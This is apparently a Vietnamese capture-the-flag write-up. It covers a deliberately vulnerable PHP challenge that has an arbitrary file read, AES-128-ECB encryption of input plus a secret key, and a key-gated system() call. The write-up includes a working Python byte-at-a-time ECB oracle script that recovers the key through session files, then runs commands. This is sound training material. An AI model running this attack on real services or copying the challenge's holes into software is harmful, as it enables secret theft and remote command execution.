Source của bài như sau:
```php
<?php

session_start();
@require_once 'config.php';

if (isset($_GET['debug'])) {
	show_source(__FILE__);
	die();
}

define('BLOCK_SIZE', 16);

function pad($string) {
	if (strlen($string) % BLOCK_SIZE === 0)
		$plaintext = $string;
	else  {
		$s = BLOCK_SIZE - strlen($string) % BLOCK_SIZE;
		$plaintext = $string.str_repeat(chr($s), $s);
	} 
	return $plaintext;
}
function encrypt($name) {
	global $auth_key, $key_for_enc; // from config.php with luv!!

	$method = 'AES-128-ECB';
	$plaintext = pad($name.$auth_key);
	return bin2hex(openssl_encrypt($plaintext, $method, $key_for_enc, OPENSSL_RAW_DATA));
}

if (isset($_GET["name"])) 
	$_SESSION["name"] = encrypt($_GET['name']);

if (isset($_GET['file'])) { // safe() in config.php, try to guess my filter =))
	if (safe($_GET['file'])) 
		@readfile($_GET['file']);
	else die("Dont hack me please =((((");
}

if (isset($_GET['auth_key'])) {
	if ($_GET['auth_key'] === $auth_key) {
		if ( isset($_GET["command"]) && strlen($_GET["command"]) <= 5)
			@system($_GET["command"]);
	}
	else echo "Wrong auth_key!!";
}

?>


<h1>Hello hacker ^>^ </h1>

<!-- 
// TODO: Remove 

<strong>To debug, use ?debug=hint </strong>
-->
```

Đây là một bài của anh Nhiên ra khá là khoai so với mình(vì mình chưa học mấy kiểu mã hóa này). 

Phân tích source code:

Mục đích cuối cùng là có thể truyền `command` vào, mà để có thể truyền được `command` thì ta phải lấy được `auth_key`.

-> `auth_key` được nằm trong file `config.php`, chúng ta nhìn thấy có 1 cái param truyền vào là file và được content file. Một ý nghĩ đã thoáng qua đầu mình là dùng cái đó để đọc 
file config nhưng không được vì đã bị filter và hàm `safe` nằm trong file `config.php`.

Rồi ok đến phân tích đoạn khó nhất của bài này đó là hàm `encrypt`. Đây là hàm sử dụng thuật toán mã hóa `AES-128-ECB`. 

Thuật toán mã hóa `ECB` được miêu tả như sau:

![image](https://user-images.githubusercontent.com/96786536/157676314-c26af337-edf6-4536-879d-0da24e51c740.png)

Các bạn có thể tham khảo thêm ở đây: https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation

Rồi tấn công như thế nào. Đây là thuật toán khá yếu và mình có thể brute force từng kí tự của `auth_key`. Vì đây là thuật toán mã hóa dạng khối (16 byte 1 khối), ta có thể tấn công như sau:

VD ta có payload: `aaaaaaaaaaaaaaa{char}aaaaaaaaaaaaaaa`.
`char` sẽ là kí tự mà chúng ta brute force. Khi payload + auth_key -> `aaaaaaaaaaaaaaaAaaaaaaaaaaaaaaaXXXXXXXXXXXXXX`, XXXXXXXXXXXXXX là auth_key(bạn có thể test và thấy auth_key có độ dài 14). Khi thực hiện mã hóa sẽ hia chuỗi trên thành các khối như sau: `aaaaaaaaaaaaaaa{char}` và `aaaaaaaaaaaaaaaX` rồi ta thực hiện brute force char đến khi 2 block bằng nhau thôi. Mình giải thích hơi khó hiểu mọi người có thể đọc ở đây https://zachgrace.com/posts/attacking-ecb/.

Đây là script của mình: 
```python
import requests as r
from string import printable


cookie = {
    "PHPSESSID": "panshloogognn8pto755ibdi29"
}

url = 'http://localhost:2010/'

# sau khi thu thi biet duoc auth key co do dai la 14
auth_key = ""
for i in range(15, 0, -1):
    for char in printable:
        payload = f'?name={"A" * i + auth_key + char + "A" * i}'
        res = r.get(url + payload, cookies = cookie)
        res = r.get(url + "?file=/tmp/sess_panshloogognn8pto755ibdi29").text
        # print(res.split('"')[1], payload)
        res = res.split('"')[1]

        if res[:32] == res[32:64]:
            auth_key += char
            print(auth_key)
            break
```

Lấy được auth_key là: `AuthKey4N00b3r`.

Thực hiện command thôi:

![image](https://user-images.githubusercontent.com/96786536/157678507-7b13fdc7-0362-4a67-b75f-72173a23690c.png)

